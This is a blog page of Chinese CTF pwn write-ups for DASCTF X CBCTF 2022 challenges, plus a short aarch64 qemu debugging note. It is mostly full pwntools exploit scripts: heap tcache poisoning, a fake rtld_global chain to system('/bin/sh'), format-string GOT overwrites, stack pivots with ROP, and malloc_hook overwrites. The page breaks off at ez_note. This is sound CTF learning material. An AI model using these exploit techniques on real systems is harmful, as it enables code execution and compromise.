<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"># encoding = utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./note2&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def menu(n):</span><br><span class="line">    sla(b&#x27;&gt; &#x27;, str(n))</span><br><span class="line"></span><br><span class="line">def add(idx, size, con):</span><br><span class="line">    menu(1)</span><br><span class="line">    sla(b&#x27;&gt; &#x27;, str(idx))</span><br><span class="line">    sla(b&#x27;&gt; &#x27;, str(size))</span><br><span class="line">    sla(b&#x27;: &#x27;, con)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    menu(2)</span><br><span class="line">    sla(b&#x27;&gt; &#x27;, str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    menu(3)</span><br><span class="line">    sla(b&#x27;&gt; &#x27;, str(idx))</span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    add(i,0xf8,b&#x27;youlin&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">key=u64(io.recv(5).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">heapbase=key&lt;&lt;12</span><br><span class="line"></span><br><span class="line">delete(8)</span><br><span class="line">show(8)</span><br><span class="line">libcbase=uu64()-0x219ce0</span><br><span class="line">print(&quot;libcbase:&quot;+hex(libcbase))</span><br><span class="line">system=libcbase+libc.sym[&#x27;system&#x27;]</span><br><span class="line">sh = libcbase + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">set_context = libcbase + libc.sym[&#x27;setcontext&#x27;] + 61</span><br><span class="line">l_next = libcbase + 0x276890</span><br><span class="line">print(&quot;l_next:&quot;+hex(l_next))</span><br><span class="line">rtld = libcbase + 0x275040</span><br><span class="line">ret = libcbase + 0x29cd6</span><br><span class="line">pop_rdi = libcbase + 0x2a3e5</span><br><span class="line">environ = libcbase + 0x221200</span><br><span class="line">dbg()</span><br><span class="line"></span><br><span class="line">delete(7)</span><br><span class="line">add(6,0x1f8,b&#x27;youlin&#x27;)</span><br><span class="line">add(0,0xf8,b&#x27;youlin&#x27;)</span><br><span class="line"></span><br><span class="line">delete(8)</span><br><span class="line">delete(7)</span><br><span class="line">add(0,0x1f0,b&#x27;A&#x27;*0xf0+p64(0)+p64(0x101)+p64((rtld)^key))</span><br><span class="line"></span><br><span class="line">add(0,0xf0,b&#x27;youlin&#x27;)</span><br><span class="line">add(0,0xf0,p64(heapbase+0xcb0)+ b&#x27;\x04&#x27;+ b&#x27;\x00&#x27;*7)</span><br><span class="line"></span><br><span class="line">fake_rtld_global_addr = heapbase + 0xcb0</span><br><span class="line">fake_rtld_global = p64(0) + p64(l_next) + p64(0) + p64(fake_rtld_global_addr)</span><br><span class="line">fake_rtld_global += p64(set_context) + p64(ret)</span><br><span class="line">fake_rtld_global += p64(sh)</span><br><span class="line">fake_rtld_global += p64(ret)</span><br><span class="line">fake_rtld_global += p64(system)</span><br><span class="line">fake_rtld_global += b&#x27;\x00&#x27; * 0x80</span><br><span class="line">fake_rtld_global += p64(fake_rtld_global_addr + 0x28 + 0x18)</span><br><span class="line">fake_rtld_global += p64(pop_rdi)</span><br><span class="line">fake_rtld_global += b&#x27;\x00&#x27; * (0x100 - len(fake_rtld_global))</span><br><span class="line">fake_rtld_global += p64(fake_rtld_global_addr + 0x10 + 0x110) * 3</span><br><span class="line">fake_rtld_global += p64(0x10)</span><br><span class="line"></span><br><span class="line">add(0, 0x18, b&#x27;a&#x27; * 0x10 + p64(fake_rtld_global_addr + 0x20))</span><br><span class="line">add(1, 0x200, fake_rtld_global)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;\x00&#x27; * 0xfc</span><br><span class="line">payload += p8(0x8) + b&#x27;\x00&#x27; * 3</span><br><span class="line">add(2, 0x200, payload)</span><br><span class="line">menu(4)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/09/21/aarch64/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/09/21/aarch64/" class="post-title-link" itemprop="url">aarch64</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-09-21 18:57:38 / Modified: 19:05:33" itemprop="dateCreated datePublished" datetime="2022-09-21T18:57:38+08:00">2022-09-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="记录aarch64的运行和调试方法"><a href="#记录aarch64的运行和调试方法" class="headerlink" title="记录aarch64的运行和调试方法"></a>记录aarch64的运行和调试方法</h1><h2 id="以d3招新赛的stack为例"><a href="#以d3招新赛的stack为例" class="headerlink" title="以d3招新赛的stack为例"></a>以d3招新赛的stack为例</h2><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./stack</span><br></pre></td></tr></table></figure>

<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>用gdb-multiarch调试确定溢出长度</p>
<p>先将程序在指定端口跑起来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu/ ./stack</span><br></pre></td></tr></table></figure>

<p>gdb-multiarch调试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./stack</span><br><span class="line"></span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>

<p>按c继续运行程序，用pwntools生成字符串并输入到qemu运行的程序中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">cyclic(100)</span><br></pre></td></tr></table></figure>

<p><img src="https://tuchuangs.com/imgs/2022/09/21/38f62e643cc3c89e.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/" class="post-title-link" itemprop="url">DASCTF_X_CBCTF_2022九月挑战赛</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-09-20 16:27:39 / Modified: 21:25:03" itemprop="dateCreated datePublished" datetime="2022-09-20T16:27:39+08:00">2022-09-20</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="cyberprinter"><a href="#cyberprinter" class="headerlink" title="cyberprinter"></a>cyberprinter</h2><p>首先通过溢出覆盖’’\x00’，可以泄露libc.然后是一个格式化字符串漏洞修改puts里面的strlen的libc got</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./cyberprinter&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">libc=ELF(&quot;/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">onegadget=0xe6aee</span><br><span class="line">ru(&quot;Your name?pls..&quot;)</span><br><span class="line">sl(b&#x27;A&#x27;*0x17)</span><br><span class="line">libcbase=uu64()-0x1edc50</span><br><span class="line">print(&quot;libcbase:&quot;+hex(libcbase))</span><br><span class="line">onegadget=libcbase+onegadget</span><br><span class="line">abs_got=libcbase+0x1eb0a8</span><br><span class="line">payload=fmtstr_payload(8,&#123;abs_got:onegadget&#125;)</span><br><span class="line">ru(b&quot;But there is sth wrong in it,so you can&#x27;t do sth&quot;)</span><br><span class="line">sl(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h2 id="appetizer"><a href="#appetizer" class="headerlink" title="appetizer"></a>appetizer</h2><p>首先是一个检查，结合ida和调试可以发现是Nameless和两个字节的偏移，所以是发送’AANameless’来跳过check</p>
<p>之后就是一个很明显的栈迁移，但是注意不能离end开头太近，函数栈帧会因为往end里写数据而被破坏导致崩溃，所以可以使用垃圾数据把函数栈帧往下挪，使其远离end开头</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./appetizer&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">libc=ELF(&quot;/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(14),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(&quot;Let&#x27;s check your identity&quot;)</span><br><span class="line">#sl(b&quot;sselemaN&quot;)</span><br><span class="line">s(b&#x27;AANameless&#x27;)</span><br><span class="line">#sl(b&#x27;A&#x27;*2+p64(0x7373656c656d614e))</span><br><span class="line">io.recvuntil(&quot;Here you are:&quot;)</span><br><span class="line">gift=iuu64()</span><br><span class="line">print(&quot;gift:&quot;+hex(gift))</span><br><span class="line">base=gift-0x4050</span><br><span class="line">leave_ret=0x00000000000012d8+base</span><br><span class="line">pop_rdi=base+0x00000000000014d3</span><br><span class="line">pop_rsi_r15=0x00000000000014d1+base</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]+base</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]+base</span><br><span class="line">read_plt=elf.plt[&#x27;read&#x27;]+base</span><br><span class="line">main=0x1428+base</span><br><span class="line"></span><br><span class="line">payload=b&#x27;\x00&#x27;*0x60+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">ru(&quot;And pls write your own information on it&quot;)</span><br><span class="line">s(payload)</span><br><span class="line">ru(&quot;Tell me your wish:&quot;)</span><br><span class="line">payload=p64(gift+0x60-8)+p64(leave_ret)</span><br><span class="line">s(payload)</span><br><span class="line">gdb.attach(io,&#x27;b *gift&#x27;)</span><br><span class="line">libcbase=uu64()-libc.sym[&#x27;puts&#x27;]</span><br><span class="line">open_addr=libcbase+libc.sym[&#x27;open&#x27;]</span><br><span class="line">pop_rsi = libcbase + 0x27529</span><br><span class="line">pop_rdx_rbx = libcbase + 0x1626d6</span><br><span class="line">write_addr=libcbase+libc.sym[&#x27;write&#x27;]</span><br><span class="line">read_addr=libcbase+libc.sym[&#x27;read&#x27;]</span><br><span class="line">puts_addr=libcbase+libc.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">orw=b&#x27;./flag&#x27;.ljust(8,b&#x27;\x00&#x27;)+ b&#x27;\x00&#x27; * 0x70 + p64(pop_rdi) + p64(gift) + p64(pop_rsi) + p64(0) + p64(open_addr)</span><br><span class="line">orw+= p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(gift + 8) + p64(pop_rdx_rbx) + p64(0x30) + p64(0) + p64(read_plt)</span><br><span class="line">orw+=p64(pop_rdi)+p64(1)+p64(write_addr)</span><br><span class="line"></span><br><span class="line">s(orw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h1 id="bar"><a href="#bar" class="headerlink" title="bar"></a>bar</h1><p>一道比较简单的堆题，首先3选项可以直接泄露出libc，而且uaf,堆溢出都有</p>
<p>首先泄露出libc，接着利用堆溢出构造出unsorted bin，使得堆块重叠，任意修改tcache的fd指针打malloc_hook</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./bar&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">libc=ELF(&quot;/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(15),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def cmd(choice):</span><br><span class="line">    sla(&quot;Your choice:&quot;,str(choice))</span><br><span class="line"></span><br><span class="line">def add(choice,content):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sla(&quot;Whisky , brandy or Vodka?&quot;,str(choice))</span><br><span class="line">    sla(&quot;You may want to tell sth to the waiter:&quot;,content)</span><br><span class="line"></span><br><span class="line">def delete(idx, size):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sla(b&#x27;Which?&#x27;, str(idx))</span><br><span class="line">    sla(b&#x27;How much?&#x27;, str(size))</span><br><span class="line"></span><br><span class="line">def leak():</span><br><span class="line">    cmd(3)</span><br><span class="line"></span><br><span class="line">leak()</span><br><span class="line">ru(&quot;We will give everyone only one cup of icecream!&quot;)</span><br><span class="line">libcbase=iuu64()-0x1ec6a0</span><br><span class="line">onegadget=libcbase+0xe6af1</span><br><span class="line">malloc_hook=libcbase+libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">lg=(&#x27;libcbase&#x27;)</span><br><span class="line"></span><br><span class="line">add(0,b&#x27;youlin&#x27;)#0</span><br><span class="line">add(0,b&#x27;youlin&#x27;)#1</span><br><span class="line">add(2,b&#x27;youlin&#x27;)#2</span><br><span class="line">add(2,b&#x27;youlin&#x27;)#3</span><br><span class="line">add(2,b&#x27;youlin&#x27;)#4</span><br><span class="line">add(0,b&#x27;youlin&#x27;)#5</span><br><span class="line">add(0,b&#x27;youlin&#x27;)#6</span><br><span class="line">add(0,b&#x27;youlin&#x27;)#7</span><br><span class="line">add(0,b&#x27;youlin&#x27;)#8</span><br><span class="line"></span><br><span class="line">delete(3,0x40)</span><br><span class="line">delete(2,0x40)</span><br><span class="line">delete(0,0x100)</span><br><span class="line">add(0,b&#x27;A&#x27;*0xf8+p64(0x421))</span><br><span class="line">delete(1,0x100)</span><br><span class="line"></span><br><span class="line">add(1,b&#x27;youlin&#x27;)</span><br><span class="line">add(0,b&#x27;A&#x27;*0x98+p64(0x51)+p64(malloc_hook-0x10))</span><br><span class="line"></span><br><span class="line">add(2,b&#x27;youlin&#x27;)</span><br><span class="line">add(2,p64(onegadget))</span><br><span class="line"></span><br><span class="line">add(1,b&#x27;youlin&#x27;)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h1 id="ez-note"><a href="#ez-note" class="headerlink" title="ez_note"></a>ez_note</h1><p>整数溢出造成的堆溢出，利用溢出修改出unsorted的size大小，造成堆重叠</p>
